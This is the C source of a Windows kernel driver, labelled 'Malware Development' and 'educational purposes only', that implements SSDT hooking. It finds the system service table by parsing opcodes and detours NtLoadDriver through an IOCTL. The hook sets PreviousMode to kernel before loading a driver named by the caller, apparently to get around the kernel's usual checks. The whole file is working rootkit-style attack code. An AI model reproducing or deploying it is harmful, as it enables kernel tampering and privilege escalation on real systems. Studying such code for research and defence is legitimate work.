/*
╔═════════════════════════════════════════════════════════════╗
║                                                             ║
║                 ⚠️  Malware Development  ⚠️                 ║
║                                                             ║
║  @author: bekoo                                             ║
║  @website : 0xbekoo.github.io                               ║
║  @warning : This project has been developed                 ║
║              for educational purposes only.                 ║
║                                                             ║
║  @project: SSDT Hooking - UserMode Program                  ║
║  @platform: Windows 11 24H2 (Build: 26100.3194)             ║
║                                                             ║
╚═════════════════════════════════════════════════════════════╝
*/

#pragma warning(disable:4996)

#include "main.h"
#include "hook.h"

#define SSN_NTLOADDRIVER 0x10E

PVOID g_NtLoadDriverAddress = NULL;

NTSTATUS HookedNtLoadDriver(PUNICODE_STRING DriverServiceName) {
	UNICODE_STRING UserBuffer;
	BOOLEAN PreviousStatus = FALSE;
	NTSTATUS Status = STATUS_SUCCESS;

	HkRestoreFunction((PVOID)g_NtLoadDriverAddress, (PVOID)OriginalNtLoadDriver);
	if (DriverServiceName->Buffer == NULL || DriverServiceName->Length == 0) {
		DbgPrintEx(0, 0, "Invalid DriverServiceName\n");
		return STATUS_INVALID_PARAMETER;
	}

	UserBuffer.Buffer = ExAllocatePoolWithTag(NonPagedPool, DriverServiceName->Length, 'buff');
	if (UserBuffer.Buffer == NULL) {
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	UserBuffer.Length = DriverServiceName->Length;
	UserBuffer.MaximumLength = DriverServiceName->MaximumLength;

	__try {
		RtlCopyMemory(UserBuffer.Buffer, DriverServiceName->Buffer, DriverServiceName->Length);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		DbgPrintEx(0, 0, "Exception occurred during RtlCopyMemory\n");
		ExFreePoolWithTag(UserBuffer.Buffer, 'buff');
		return GetExceptionCode();
	}
	DbgPrintEx(0, 0, "Driver: %wZ\n", &UserBuffer);

	PreviousStatus = ChangePreviousMode(0);
	if (!PreviousStatus) {
		goto Clean;
	}

	_NtLoadDriver NtLoadDriver = (_NtLoadDriver)g_NtLoadDriverAddress;
	Status = NtLoadDriver(&UserBuffer);

Clean:
	PreviousStatus = ChangePreviousMode(1);
	if (!PreviousStatus) {
		if (Status == 0) {
			Status = STATUS_UNSUCCESSFUL;
		}
	}

	ExFreePoolWithTag(UserBuffer.Buffer, 'buff');
	return Status;
}

PVOID GetSSDTAddress(PVOID KeAddSystemServiceAddr) {
	/*
		------------------
		kd> u nt!KeAddSystemServiceTable+0xbd L1
		nt!KeAddSystemServiceTable+0xbd:
		fffff800`aae7bdcd 48391d0c5b7800  cmp     qword ptr [nt!KeServiceDescriptorTable+0x20 (fffff800`ab6018e0)],rbx
		------------------
		
		We will dynamically obtain the address of the SSDT by reading the opcodes at this address by the KeAddSystemServiceTable address.

	*/
	PVOID AddressToRead = NULL;
	PVOID NewAddress = NULL;
	PBYTE Instruction = (PBYTE)KeAddSystemServiceAddr + 0xbd;

	/* Get Offset Address */
	DWORD OffsetAddress = *(PDWORD)(Instruction + 3);

	/* Calculate RIP */
	UINT_PTR rip = (UINT_PTR)Instruction + 7;

	/* Add Offset Address to RIP */
	AddressToRead = (PVOID)(rip + (INT32)OffsetAddress);

	/* Get Absolute Address */
	AddressToRead = (PVOID)((PBYTE)AddressToRead - 0x20);

	NewAddress = GetAddress(AddressToRead);

	return NewAddress;
}

NTSTATUS IoCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;

	switch (Stack->MajorFunction) {

	case IRP_MJ_CREATE:
		Irp->IoStatus.Status = STATUS_SUCCESS;
		break;

	case IRP_MJ_CLOSE:
		Irp->IoStatus.Status = STATUS_SUCCESS;
		break;

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return Irp->IoStatus.Status;
}

NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
	BOOLEAN Value;
	switch (Stack->Parameters.DeviceIoControl.IoControlCode) {

	case IOCTL_TRAMPOLINE:
		Value = *(PBOOLEAN)Irp->AssociatedIrp.SystemBuffer;
		if (!Value) {
			Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
			Irp->IoStatus.Information = 0;
			break;
		}
		DbgPrintEx(0, 0, "IOCTL_TRAMPOLINE code received\n");

		HkDetourFunction((PVOID)g_NtLoadDriverAddress, (PVOID)HookedNtLoadDriver, 20, (PVOID*)&OriginalNtLoadDriver);

		Irp->IoStatus.Status = STATUS_SUCCESS;
		Irp->IoStatus.Information = 0;
		break;

	default:
		Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
		Irp->IoStatus.Information = 0;
		break;
	}
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return Irp->IoStatus.Status;
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);

	UNICODE_STRING SymName = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
	DbgPrintEx(0, 0, "Unloading the Driver...\n");

	IoDeleteSymbolicLink(&SymName);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT	DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\MyDriver");
	UNICODE_STRING SymName = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS Status;

	Status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(Status)) {
		DbgPrintEx(0, 0, "Failed to Create I/O Device!\n");
		return Status;
	}

	Status = IoCreateSymbolicLink(&SymName, &DeviceName);
	if (!NT_SUCCESS(Status)) {
		DbgPrintEx(0, 0, "Failed to Create Symbolic Link!\n");
		return Status;
	}

	UNICODE_STRING KeAddSystemString;
	PVOID fKeAddSystemAddress = NULL;
	RtlInitUnicodeString(&KeAddSystemString, L"KeAddSystemServiceTable");

	fKeAddSystemAddress = (PVOID)MmGetSystemRoutineAddress(&KeAddSystemString);
	DbgPrintEx(0, 0, "KeAddSystemServiceTable Address: 0x%p\n", fKeAddSystemAddress);

	PVOID SSDTAddress = GetSSDTAddress(fKeAddSystemAddress);
	DbgPrintEx(0, 0, "SSDT Address: 0x%p\n", SSDTAddress);

	/*
		Offset = SSDT + 4 * SSN
	*/
	UINT32 Offset = *(PUINT32)((PUCHAR)SSDTAddress + 4 * SSN_NTLOADDRIVER);
	DbgPrintEx(0, 0, "Offset: 0x%x\n", Offset);

	/*
		RoutineAddress = SSDT + (Offset >>> 4)
	*/
	g_NtLoadDriverAddress = (PVOID)((PUCHAR)SSDTAddress + (Offset >> 4));
	DbgPrintEx(0, 0, "NtLoadDriver Address: 0x%p\n\n", g_NtLoadDriverAddress);

	DriverObject->MajorFunction[IRP_MJ_CREATE] = IoCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = IoCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;
	DriverObject->DriverUnload = UnloadDriver;

	return STATUS_SUCCESS;
}
